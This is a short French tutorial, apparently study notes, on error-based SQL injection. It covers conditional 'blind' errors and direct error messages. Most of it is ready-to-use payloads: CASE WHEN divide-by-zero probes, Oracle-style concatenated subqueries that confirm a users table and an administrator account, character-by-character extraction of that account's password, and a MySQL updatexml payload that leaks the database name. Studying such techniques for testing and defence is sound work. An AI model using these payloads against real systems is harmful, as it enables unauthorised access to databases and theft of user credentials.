# Error-Based SQL injection

L’Error-Based SQLi est une technique d’injection SQL qui consiste à provoquer une erreur volontaire pour que le serveur affiche un message contenant des informations sensibles sur la base de données.



## Objectif :

- Obtenir des infos comme : nom de la base, noms de colonnes, versions, etc.
- Rendre visibles des vulnérabilités qui étaient invisibles.


## Deux types d’erreurs exploitées:

**1. Erreur conditionnelle (Blind Error-Based)**

On déclenche une erreur seulement si une condition est vraie.


```sql
' AND (SELECT CASE WHEN (username='admin') THEN 1/0 ELSE 1 END) -- 
```
- Si admin existe → division par zéro → erreur
- Sinon → pas d’erreur

```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
-- No Error

xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a 
-- Error

'||(SELECT '')||'
'||(SELECT '' FROM dual)||'
-- No Error

'||(SELECT '' FROM not-a-real-table)||'
-- Error
```

Si on a une erreur, Cela démontre qu'il est possible de déclencher une erreur conditionnellement à la véracité d'une condition spécifique.

```sql
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
-- vérifier l'existence de la table users. Comme cette requête ne renvoie pas d'erreur, vous pouvez en déduire que cette table existe bel et bien.

'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- vérifier l'existence du nom d'utilisateur : administrator. Vérifiez que la condition est vraie (l'erreur est reçue), confirmant qu'il existe un utilisateur appelé administrator.

'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- déterminer le nombre de caractères du mot de passe de l'administrator. Cette condition doit être vraie, confirmant que le mot de passe comporte plus d'un caractère.

'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
-- confirmer que le premier caractère du mot de passe est a
```


**2. Erreur contenant les données (Direct Error**)

On déclenche une erreur SQL qui contient directement la donnée recherchée.


```sql
' AND updatexml(null, concat(0x7e, (SELECT database()), 0x7e), null) -- 
```

- Affiche le nom de la base dans l’erreur.
- Utilisé pour extraire des données directement via les messages d’erreur.